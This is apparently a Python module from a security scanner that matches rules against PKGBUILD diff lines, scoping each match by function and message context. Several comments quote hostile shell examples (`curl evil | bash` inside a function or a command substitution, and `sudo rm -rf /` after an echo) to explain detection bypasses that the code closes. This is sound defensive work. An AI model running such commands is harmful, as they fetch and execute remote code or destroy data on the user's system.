import re

from .config import load_rules
from .findings import stamp
from .tokenizer import join_line_continuations

# Lines starting with # after stripping + prefix are comments.
# Dependency declarations contain package names, not code; matching
# inside them produces false positives.  validpgpkeys is deliberately
# excluded: it is covered by rule R014 and must not be filtered out.
_COMMENT_OR_DEP_RE = re.compile(
    r"^(?:\+|)\s*(?:"
    r"#"
    r"|(?:depends|makedepends|optdepends|checkdepends)\s*=\s*\("
    r")"
)

# Message strings (echo/printf/note arguments) are not execution contexts.
# Keywords appearing in them are false positives.
_MESSAGE_LINE_RE = re.compile(
    r'^(?:\+|)\s*(?:echo|printf|note|msg|warning|error|info)\s+["\']'
)

# ...but only when the line is *nothing but* that message.  A shell line
# does not end at its first command: `echo "x"; sudo rm -rf /` executes,
# and `echo "$(curl evil | bash)"` runs a command substitution inside the
# quotes.  Treating the whole line as inert let a seven-character prefix
# switch off every scoped rule, so any separator or substitution after
# the message keyword disqualifies the line from message context.
_COMMAND_CHAIN_RE = re.compile(r"[;&|]|\$\(|`")

# Track function body boundaries for position-aware scoring.
_FUNCTION_OPEN_RE = re.compile(r"^\s*\w+\s*\(\s*\)\s*\{")
_FUNCTION_CLOSE_RE = re.compile(r"^\s*\}")

# Same shape, but capturing the name so a rule can scope itself to one
# function.  "curl in build()" is routine; "curl in pkgver()" is not, and
# a plain function_body scope cannot tell them apart.
_FUNCTION_NAME_RE = re.compile(r"^(\w+)\s*\(\s*\)\s*\{")


# Compiled rule patterns, keyed by pattern text.  re's own cache is bounded
# at 512 entries and is shared with every other pattern the process compiles,
# so a corpus scan can evict rule patterns and recompile them per diff.  An
# invalid pattern is remembered as None so it is only reported once.
_pattern_cache: dict[str, "re.Pattern | None"] = {}


def _compiled(pattern: str):
    """Return the compiled form of *pattern*, or None if it is invalid."""
    try:
        return _pattern_cache[pattern]
    except KeyError:
        pass
    try:
        compiled = re.compile(pattern, re.IGNORECASE)
    except re.error:
        compiled = None
    _pattern_cache[pattern] = compiled
    return compiled


def _to_pairs(lines: list[str]) -> list[tuple[int, str]]:
    """pair each line with its original index"""
    return [(i, line) for i, line in enumerate(lines)]


def filter_raw_lines(lines: list[str]) -> list[tuple[int, str]]:
    """Remove comment lines and dependency declarations from raw diff lines.

    Returns (original_index, line) pairs so callers can map back to context.
    """
    return [(i, line) for i, line in enumerate(lines) if not _COMMENT_OR_DEP_RE.match(line)]


def _is_message_line(line: str) -> bool:
    """True when *line* is a message and nothing else."""
    return bool(_MESSAGE_LINE_RE.match(line)) and not _COMMAND_CHAIN_RE.search(line)


def _inline_body(stripped: str) -> bool:
    """True when a function opens and carries code on the same line.

    ``package() { curl evil | bash; }`` is a function body, but the
    opening line used to be classified before the depth counter moved,
    so it read as ``other`` and escaped every ``function_body`` scope.
    """
    match = _FUNCTION_OPEN_RE.search(stripped)
    if not match:
        return False
    rest = stripped[match.end():].strip()
    return bool(rest) and rest != "}"


def _classify_line_context(lines: list[str]) -> dict[int, str]:
    """Return {line_index: context_name} for each line.

    Contexts: ``"function_body"``, ``"message"``, or ``"other"``.
    """
    contexts: dict[int, str] = {}
    depth = 0
    for i, line in enumerate(lines):
        stripped = line.lstrip("+").lstrip()
        if _is_message_line(line):
            contexts[i] = "message"
        elif depth > 0 or _inline_body(stripped):
            contexts[i] = "function_body"
        else:
            contexts[i] = "other"
        if _FUNCTION_OPEN_RE.search(stripped):
            depth += 1
            # Opened and closed on one line, so it must not leave the
            # counter raised for everything that follows.
            if stripped.rstrip().endswith("}"):
                depth -= 1
        elif _FUNCTION_CLOSE_RE.search(stripped):
            depth = max(0, depth - 1)
    return contexts


def _classify_enclosing_function(lines: list[str]) -> dict[int, str]:
    """Return ``{line_index: enclosing_function_name}``.

    Lines outside any function are absent from the mapping.  A bare
    header line is not considered inside its own function, matching
    :func:`_classify_line_context`; a header that also carries code
    (``pkgver() { ...; }``) is, since that code really does run there.
    """
    enclosing: dict[int, str] = {}
    stack: list[str] = []
    for i, line in enumerate(lines):
        stripped = line.lstrip("+").lstrip()
        match = _FUNCTION_NAME_RE.search(stripped)
        if stack:
            enclosing[i] = stack[-1]
        elif match and _inline_body(stripped):
            # Code sharing the line with its own `pkgver() {` header is
            # inside that function, so a scope naming it must match.
            enclosing[i] = match.group(1)
        if match:
            stack.append(match.group(1))
        elif _FUNCTION_OPEN_RE.search(stripped):
            stack.append("")
        if _FUNCTION_OPEN_RE.search(stripped):
            if stripped.rstrip().endswith("}") and stack:
                stack.pop()
        elif _FUNCTION_CLOSE_RE.search(stripped) and stack:
            stack.pop()
    return enclosing


def _scope_matches(
    scope: list[str], index: int, ctx_map: dict[int, str], fn_map: dict[int, str]
) -> bool:
    """Check *index* against a rule's scope.

    A scope entry matches either a line context (``function_body``,
    ``message``, ``other``) or the name of the enclosing function
    (``pkgver``, ``package``, ...).
    """
    ctx = ctx_map.get(index, "other")
    if ctx in scope:
        return True
    enclosing = fn_map.get(index)
    return enclosing is not None and enclosing in scope


def apply_rules(
    resolved_strings: list[str],
    raw_diff_lines: list[str],
    rules: list[dict] | None = None,
    include_experimental: bool = False,
    line_map: dict[int, tuple[str, int]] | None = None,
) -> list[dict]:
    """Match rules against diff lines and return triggered findings."""
    if rules is None:
        rules = list(load_rules())
    # R013, R047, R048 patterns are dynamically generated from config or
    # Unicode data rather than hardcoded in the TOML file.
    for rule in rules:
        if rule["id"] == "R013":
            from .unicode import R013_UNCONDITIONAL_PATTERN
            rule["pattern"] = (
                R013_UNCONDITIONAL_PATTERN
                + r"|(?<![^\x00-\x7F])[\u200B-\u200F\uFEFF](?![^\x00-\x7F])"
            )
        elif rule["id"] == "R047":
            from .config import _standard_port_pattern
            rule["pattern"] = _standard_port_pattern()
        elif rule["id"] == "R048":
            from .config import _free_registrar_tld_pattern
            rule["pattern"] = _free_registrar_tld_pattern()

    triggered = []
    ctx_map = _classify_line_context(raw_diff_lines)
    fn_map = _classify_enclosing_function(raw_diff_lines)

    # These three candidate lists do not vary per rule, but used to be
    # rebuilt inside the loop: with ~75 rules that was 75 filtering passes
    # over every line of the diff.  Built once and shared, read-only.
    raw_candidates = filter_raw_lines(raw_diff_lines)
    added_candidates = [(i, ln) for i, ln in raw_candidates if ln.startswith("+")]
    resolved_candidates = _to_pairs(resolved_strings)

    for rule in rules:
        if rule.get("experimental") and not include_experimental:
            continue
        # R009 is a code rule (analysis/build.py).  A stale rules.toml from
        # before the migration would otherwise double-fire the regex form.
        if rule["id"] == "R009":
            continue

        match_target = rule.get("match_target", "raw_line")
        if match_target == "raw_line":
            candidates = (
                added_candidates if rule.get("added_only") else raw_candidates
            )
        else:
            candidates = resolved_candidates

        compiled = _compiled(rule["pattern"])
        if compiled is None:
            continue

        rule_scope = rule.get("scope") if match_target == "raw_line" else None

        for idx, item in candidates:
            if compiled.search(item):
                if rule_scope and not _scope_matches(rule_scope, idx, ctx_map, fn_map):
                    continue
                finding = {
                    "rule_id": rule["id"],
                    "name": rule["name"],
                    "severity": rule["severity"],
                    "category": rule["category"],
                    "match": item[:100],
                }
                if line_map and idx in line_map:
                    finding["file"], finding["line"] = line_map[idx]
                triggered.append(stamp(finding, f"{rule['name']}: {{match}}"))
                break

    return triggered


def get_raw_diff_lines(diff_text: str) -> list[str]:
    """Return non-empty diff lines with continuations joined."""
    lines = []
    for line in join_line_continuations(diff_text.splitlines()):
        stripped = line.strip()
        if stripped:
            lines.append(stripped)
    return lines
